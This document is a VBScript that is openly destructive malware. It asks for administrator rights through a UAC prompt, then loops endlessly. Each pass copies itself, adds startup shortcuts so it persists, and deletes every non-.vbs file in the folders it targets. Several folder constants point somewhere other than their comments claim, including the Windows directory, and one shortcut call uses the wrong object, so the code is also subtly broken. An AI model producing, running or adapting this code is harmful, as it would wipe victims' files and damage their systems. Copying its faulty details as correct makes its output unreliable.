Set objShell = CreateObject("WScript.Shell")

' Check if the script is already running with administrator privileges
If Not objShell.Run("cmd /k cd %windir% & whoami /groups | findstr /b /c:""Mandatory Label\High Mandatory Level""") = 0 Then
    ' If not running with administrator privileges, prompt to run as administrator
    objShell.Run "cmd /k cd %windir% & net session >nul 2>&1 || (echo Set UAC = CreateObject^(""Shell.Application""^) : UAC.ShellExecute ""wscript.exe"", """ & WScript.ScriptFullName & """, """", ""runas"", 1 : Set UAC = Nothing : exit"") & exit", 1, True
    WScript.Quit
End If

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("Shell.Application")
strScriptPath = WScript.ScriptFullName

' Specify the number of copies you want to create
numCopies = 5

Do While True
    For i = 1 To numCopies
        strCopyPath = objFSO.GetParentFolderName(strScriptPath) & "\Copy" & i & ".vbs"
        objFSO.CopyFile strScriptPath, strCopyPath
        
        ' Get the path to the desktop folder
        strDesktopFolder = objFSO.GetSpecialFolder(0) ' 0 represents the Desktop folder
        
        ' Create a copy of the script on the desktop
        strDesktopCopyPath = strDesktopFolder & "\Copy" & i & ".vbs"
        objFSO.CopyFile strCopyPath, strDesktopCopyPath
        
        ' Get the path to the startup folder
        strStartupFolder = objFSO.GetSpecialFolder(2) ' 2 represents the Startup folder
        
        ' Create a shortcut to the copied script in the startup folder
        Set objShortcut = objShell.CreateShortcut(strStartupFolder & "\Copy" & i & ".lnk")
        objShortcut.TargetPath = strDesktopCopyPath
        objShortcut.Save
    Next

    ' Loop through the desktop folder and delete non-vbs files
    For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
        If objFSO.GetExtensionName(objFile.Name) <> "vbs" Then
            objFSO.DeleteFile objFile.Path, True
        End If
    Next

    ' Loop through the file explorer and delete non-vbs files
    strExplorerPath = objShell.Namespace(0).Self.Path
    Set objExplorerFolder = objFSO.GetFolder(strExplorerPath)
    For Each objSubFolder In objExplorerFolder.SubFolders
        For Each objFile In objSubFolder.Files
            If objFSO.GetExtensionName(objFile.Name) <> "vbs" Then
                objFSO.DeleteFile objFile.Path, True
            End If
        Next
    Next
    
    ' Wait for a certain amount of time before looping again
    WScript.Sleep 0
Loop
